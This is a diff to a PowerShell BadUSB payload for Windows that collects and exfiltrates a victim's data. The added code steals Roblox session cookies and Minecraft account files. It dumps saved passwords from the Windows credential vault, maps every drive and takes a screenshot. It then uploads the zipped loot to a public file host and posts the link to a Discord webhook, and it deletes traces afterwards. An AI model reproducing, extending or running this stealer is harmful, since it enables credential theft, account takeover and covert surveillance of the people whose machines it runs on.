@@ -1,7 +1,7 @@
 ############################################################################################################################################################                      
 #                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
-# Title        : ADV-Recon         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
-# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
+# Title        : Recon             | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
+# Author       : Jakoby+Sealldev   |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
 # Version      : 2.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
 # Category     : Recon             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
 # Target       : Windows 10,11     |                                                                   |___/ #           /\/|_      __/\\                  #     
@@ -41,6 +41,7 @@ $FileName = "$FolderName.txt"
 $ZIP = "$FolderName.zip"
 
 New-Item -Path $env:tmp/$FolderName -ItemType Directory
+New-Item -Path $env:tmp/$FolderName/Trees -ItemType Directory
 
 ############################################################################################################################################################
 
@@ -52,13 +53,69 @@ New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
 ############################################################################################################################################################
 
-# Get Roblox Cookies
-$robloxCookies = (Get-ItemProperty -Path "HKCU:\Software\Roblox\RobloxStudioBrowser\roblox.com" | Select-Object .ROBLOSECURITY | Format-Table -AutoSize -Wrap |Out-String)+(Get-ItemProperty -Path "HKCU:\Software\Roblox\RobloxStudioBrowser\roblox.com" | Select-Object .RBXID | Format-Table -AutoSize -Wrap | Out-String)
+# Send out started message!
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = $FolderName
+  'content' = "BadUSB started on me!"
+}
+
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
 
 ############################################################################################################################################################
 
-# Recon all User Directories
-tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
+# Get Roblox Cookies
+function get-RobloxCookies {
+	try {
+	$roblox = Get-ItemProperty -Path "HKCU:\Software\Roblox\RobloxStudioBrowser\roblox.com" 
+	$RBXID = roblox | Select-Object .RBXID | Format-Table -AutoSize -Wrap | Out-String
+	$RobloSec = roblox | Select-Object .ROBLOSECURITY | Format-Table -AutoSize -Wrap |Out-String
+	$robloxCookies=$RobloSec+$RBXID
+	}
+
+	catch {
+	Write-Error "No roblox cookies found!"
+	return $null
+	-ErrorAction SilentlyContinue
+	}
+	
+	return $robloxCookies
+}
+
+$roblox = get-RobloxCookies
+if ($roblox -ne $null) {
+	$roblox >> $env:tmp/$FolderName/RobloxCookies.txt
+}
+
+# Get Minecraft Account Details
+function get-MinecraftAccounts {
+	try {
+		$data = Get-Content -Path "$env:appdata/.minecraft/launcher_accounts.json"
+	}
+	
+	catch {
+		Write-Error "Minecraft data not found!"
+		return $null
+		-ErrorAction SilentlyContinue
+	}
+	
+	return $data
+}
+
+$minecraft = get-MinecraftAccounts
+if ($minecraft -ne $null) {
+	$minecraft >> $env:tmp/$FolderName/MinecraftAccounts.json
+}
+
+############################################################################################################################################################
+
+# Recon all Drives
+$drives = (Get-PSDrive -PSProvider FileSystem).Root
+foreach($Drive in $drives) {
+    $DriveName = $Drive.Replace(":\","")
+    tree $Drive /a /f >> $env:TEMP\$folderName\Trees\tree-$DriveName.txt
+}
 
 # Powershell history
 Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt
@@ -226,11 +283,11 @@ $computerModel = $computerSystem.Model
 
 $computerManufacturer = $computerSystem.Manufacturer
 
-$computerUUID = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
+$computerUUID = Get-WmiObject -Class Win32_ComputerSystemProduct | Select UUID | Out-String
 
 $computerBIOS = Get-CimInstance CIM_BIOSElement  | Out-String
 
-$computerOs=(Get-WMIObject win32_operatingsystem) | Select Caption, Version  | Out-String
+$computerOs=Get-WMIObject win32_operatingsystem | Select Caption, Version  | Out-String
 
 $computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List  | Out-String
 
@@ -240,15 +297,7 @@ $computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Proper
 
 $computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table  | Out-String
 
-$computerWindowsKey=$null;
-$computerWindowsKey=(Get-WmiObject -query ‘select * from SoftwareLicensingService’).OA3xOriginalProductKey
-If ($computerWindowsKey -ne $null) {
-$computerWindowsKey=(Get-WmiObject -query ‘select * from SoftwareLicensingService’).OA3xOriginalProductKey
-}
-Else 
-{
-$computerWindowsKey='No license found!'
-}
+$computerWindowsKey=Get-WmiObject SoftwareLicensingService | Select OA3xOriginalProductKey, OA3xOriginalProductKeyDescription, OA3xOriginalProductKeyPkPn | Format-List | Out-String
 
 
 ############################################################################################################################################################
@@ -483,11 +532,6 @@ $drivers
 
 ------------------------------------------------------------------------------------------------------------------------------
 
-Roblox Cookies:
-$robloxCookies
-
-------------------------------------------------------------------------------------------------------------------------------
-
 "@
 
 $output > $env:TEMP\$FolderName/computerData.txt
@@ -527,6 +571,10 @@ function Get-BrowserData {
     } 
 }
 
+[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+$vault = New-Object Windows.Security.Credentials.PasswordVault
+$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | select username,resource,password >> $env:TMP\$FolderName\BrowserPasswords.txt
+
 Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
 
 Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
@@ -536,6 +584,48 @@ Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\$FolderName\Br
 Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
 
 Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+
+############################################################################################################################################################
+
+# Get Screenshot
+[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") 
+[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
+function Get-ScreenCapture
+{
+    param(
+    [Switch]$OfWindow
+    )
+
+
+    begin {
+        Add-Type -AssemblyName System.Drawing
+        $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |
+            Where-Object { $_.FormatDescription -eq "JPEG" }
+    }
+    process {
+        Start-Sleep -Milliseconds 250
+        if ($OfWindow) {
+            [Windows.Forms.Sendkeys]::SendWait("%{PrtSc}")
+        } else {
+            [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")
+        }
+        Start-Sleep -Milliseconds 250
+        $bitmap = [Windows.Forms.Clipboard]::GetImage()
+        $ep = New-Object Drawing.Imaging.EncoderParameters
+        $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)
+        $screenCapturePathBase = "$env:temp\$FolderName\Screenshot"
+        $c = 0
+        while (Test-Path "${screenCapturePathBase}${c}.jpg") {
+            $c++
+        }
+        $bitmap.Save("${screenCapturePathBase}${c}.jpg", $jpegCodec, $ep)
+    }
+}
+
+$ss = Get-ScreenCapture
+
+# Clear clipboard of image
+Set-Clipboard -Value $null
 
 ############################################################################################################################################################
 
@@ -559,6 +649,10 @@ if (-not ([string]::IsNullOrEmpty($db))){dropbox}
 
 ############################################################################################################################################################
 
+# Upload file to temp file storage
+$text = "Loot captured! Here is the URL: "
+$text += curl.exe -F "reqtype=fileupload" -F "time=1h" -F "fileToUpload=@$env:tmp/$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+
 function Upload-Discord {
 
 [CmdletBinding()]
@@ -572,7 +666,7 @@ param (
 $hookurl = "$dc"
 
 $Body = @{
-  'username' = $env:username
+  'username' = $FolderName
   'content' = $text
 }
 
@@ -582,7 +676,7 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text $text}
 
  
 
@@ -595,7 +689,9 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
 
 # Delete contents of Temp folder 
 
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+rm $env:TEMP\$FolderName\* -r -Force -ErrorAction SilentlyContinue
+rmdir $env:TEMP\$FolderName -r -Force -ErrorAction SilentlyContinue
+rm $env:TEMP\$ZIP -r -Force -ErrorAction SilentlyContinue
 
 # Delete run box history
 
@@ -614,4 +710,4 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 # Popup message to signal the payload is done
 
-$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
+#$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
